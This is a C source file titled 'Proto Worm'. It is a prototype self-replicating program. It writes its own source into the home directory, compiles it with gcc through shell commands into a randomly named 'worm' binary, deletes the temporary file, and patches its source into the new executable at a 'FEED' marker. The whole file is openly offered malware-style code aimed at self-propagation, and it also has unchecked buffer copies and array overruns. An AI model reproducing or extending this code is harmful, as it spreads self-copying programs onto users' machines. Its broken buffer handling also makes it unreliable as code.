/* Erik Orndahl 12/8/13
__________                __            __      __                     
\______   \_______  _____/  |_  ____   /  \    /  \___________  _____  
 |     ___/\_  __ \/  _ \   __\/  _ \  \   \/\/   /  _ \_  __ \/     \ 
 |    |     |  | \(  <_> )  | (  <_> )  \        (  <_> )  | \/  Y Y  \
 |____|     |__|   \____/|__|  \____/    \__/\  / \____/|__|  |__|_|  /
                                              \/                    \/ 
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>


int main(int argc, const char * argv[])
{
    const char *homeDir = getenv("HOME"); //gets users home directory
    char dir[80];
    strcpy (dir, homeDir);
    strcat (dir, "/tmp.c"); //concatenates found dir into a temp filepath
    FILE *f = fopen(dir , "w"), *exec, *out;
    /*put source code in a char array*/
    static char a[100] = "abc", buffer[10000],source[2000] =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <time.h>\n"
    "#include <string.h>\n\n"
    "int main(int argc, const char * argv[])\n"
    "{\n"
    "const char *homeDir = getenv(\"HOME\");\n"
    "char dir[80];\n"
    "strcpy (dir, homeDir);\n"
    "strcat (dir, \"/tmp.c\");\n"
    "FILE *f = fopen(dir, \"w\"), *exec, *out;\n"
    "static char a[100] = \"abc\", buffer[10000], source[2000] = \"FEEDME\";\n"
    "fprintf(f,\"%s\", source);\n"
    "fclose(f);\n"
    "srand(time(NULL));\n"
    "int r = rand() % 1000;\n"
    "char num[10];\n"
    "sprintf(num, \"%d\", r);\n"
    "char *last = \" tmp.c\";\n"
    "char str[80];\n"
    "strcpy (str, \"cd $HOME; gcc -o worm\");\n"
    "strcat(str, num);\n"
    "strcat(str, last);\n"
    "FILE *cmd=popen(str, \"r\");\n"
    "pclose(cmd);\n"
    "system(\"cd $HOME; rm tmp.c\");\n"
    "char str2[80];\n"
    "strcpy (str2, \"/Users/eorndahl/worm\");\n"
    "char *worm = \"/worm\";\n"
    "strcpy (str2, homeDir);\n"
    "strcat (str2, worm);\n"
    "strcat (str2, num);\n"
    "exec = fopen(str2, \"rb\");\n"
    "fread(buffer, sizeof(buffer), 1, exec);\n"
    "int i, k = 0;\n"
    "unsigned char newCode[10000];\n"
    "out = fopen(str2 , \"w\");\n"
    "for(i = 0;i < sizeof(buffer);++i, ++k) {\n"
    "    if(buffer[i] == 'F' && buffer[i+1] == 'E' && buffer[i+2] == 'E' && buffer[i+3] == 'D') {\n"
    "        for(int j = 0; j < 2000; j++, i++) {\n"
    "            newCode[i] = source[j];\n"
    "        }\n"
    "        k = k + 2000;\n"
    "    }\n"
    "    else\n"
    "        newCode[i] = buffer[k];\n"
    "}\n"
    "for(i = 0;i < sizeof(buffer); ++i) {\n"
    "    fprintf(out, \"%c\", ((char *)newCode)[i]);\n"
    "}\n"
    "fclose(out);\n"
    "return 0;\n"
    "}\n";
    
    /*print source code to a new file*/
    fprintf(f,"%s", source);
    fclose(f);
    
    srand(time(NULL)); /*make randomly named new worm exec*/
    int r = rand() % 1000;
    char num[10];
    sprintf(num, "%d", r);
    char *last = " tmp.c";
    char str[80];
    strcpy (str, "cd $HOME; gcc -o worm"); //creates bash string with rand #
    strcat (str, num);
    strcat (str, last);

    FILE *cmd=popen(str, "r"); //compile that file
    pclose(cmd);
    system("cd $HOME; rm tmp.c");//kill temp


    char str2[80]; /*concatenate the new filepath for the exec*/
    char *worm = "/worm";
    strcpy (str2, homeDir);
    strcat (str2, worm);
    strcat (str2, num);

    exec = fopen(str2, "rb"); //read in binary
    fread(buffer, sizeof(buffer), 1, exec);
    
    int i, k = 0;
    unsigned char newCode[10000]; //second array for changed executable
    out = fopen(str2 , "w"); //create new file for morphed binary
    
    for(i = 0;i < sizeof(buffer);++i, ++k) {
        if(buffer[i] == 'F' && buffer[i+1] == 'E' && buffer[i+2] == 'E' && buffer[i+3] == 'D') {
            for(int j = 0; j < 2000; j++, i++) {
                newCode[i] = source[j]; //source code input directly into executable here via FEED tag
            }
            k = k + 2000;
        }
        else
            newCode[i] = buffer[k];
        
    }
    
    for(i = 0;i < sizeof(buffer); ++i) {
    fprintf(out, "%c", ((char *)newCode)[i]); //new binary written to exec
    }
    fclose(out);
    
    return 0;
}
